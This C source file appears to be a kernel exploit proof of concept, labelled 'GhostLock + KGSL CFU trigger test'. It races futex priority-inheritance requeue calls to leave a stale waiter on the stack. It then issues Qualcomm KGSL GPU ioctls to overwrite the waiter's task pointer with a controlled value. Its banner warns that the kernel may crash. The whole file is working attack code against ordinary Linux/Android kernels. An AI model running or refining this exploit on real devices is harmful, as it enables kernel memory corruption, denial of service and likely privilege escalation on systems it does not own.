#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <linux/futex.h>

#define IOC(nr,sz) (((uint32_t)3<<30)|(((uint32_t)(sz))<<16)|(((uint32_t)0x09)<<8)|((uint32_t)(nr)))

static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, done;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void *waiter(void *a) {
    (void)a;
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    ready = 1; while (!owner_ok) usleep(1000);

    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 5;
    long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI: ret=%ld errno=%d\n", r, errno);

    /* NOW: stale waiter on stack! Do KGSL ioctl immediately */
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    printf("[kgsl] fd=%d\n", fd);

    /* Create context (no SETPROP — works better!) */
    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    r = ioctl(fd, IOC(0x13, 0x08), &ctx);
    printf("[kgsl] CREATE: ret=%d id=%u\n\n", r, ctx.id);
    if (r < 0) goto out;

    /* Build ibdesc with CRASH PATTERN */
    struct { uint64_t ga; uint64_t sw; } ib = {
        0x0ULL,                          /* → pi_tree.left (NULL — safe) */
        0x4141414141414141ULL            /* → TASK pointer (INVALID — CRASH!) */
    };

    struct { uint32_t ctx; uint32_t fl; uint32_t ptr; uint32_t ts; uint32_t n; }
        cmd = {ctx.id, 0, (uint32_t)(uintptr_t)&ib, 0, 1};

    printf("[kgsl] ⚠️  Firing RB_ISSUEIBCMDS with crash pattern...\n");
    printf("[kgsl]   ibdesc: ga=0x%016llx sw=0x%016llx\n",
           (unsigned long long)ib.ga, (unsigned long long)ib.sw);
    printf("[kgsl]   If CFU overwrites waiter->task, kernel WILL crash!\n");

    errno = 0;
    r = ioctl(fd, 0xc0140910, &cmd);
    printf("[kgsl] ISSUEIBCMDS: ret=%d errno=%d\n", r, errno);
    if (r == 0)
        printf("[kgsl] ⚠️  CFU EXECUTED — check if kernel crashed!\n");

    ioctl(fd, IOC(0x14, 0x04), &ctx.id);
out:
    close(fd);
    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    done = 1;
    return 0;
}

static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    owner_ok = 1; while (!ready) usleep(1000);
    usleep(500000);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    while (!done) sleep(1);
    return 0;
}

int main(void) {
    printf("╔══════════════════════════════════════╗\n");
    printf("║  GhostLock + KGSL CFU TRIGGER TEST  ║\n");
    printf("║  ⚠️  KERNEL MAY CRASH!              ║\n");
    printf("╚══════════════════════════════════════╝\n\n");

    f_wait=0; f_pi_target=0; f_pi_chain=0;

    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0);
    usleep(200000);
    pthread_create(&ot, 0, owner, 0);
    usleep(300000);

    /* GhostLock trigger */
    printf("[trigger] CMP_REQUEUE_PI...\n");
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) { printf("[trigger] ✅ ret=%ld (attempt %d)\n", r, i); break; }
        usleep(1000);
    }

    while (!done) sleep(1);
    pthread_join(wt, 0); pthread_join(ot, 0);
    printf("\n=== DONE (if you see this, kernel survived) ===\n");
    return 0;
}
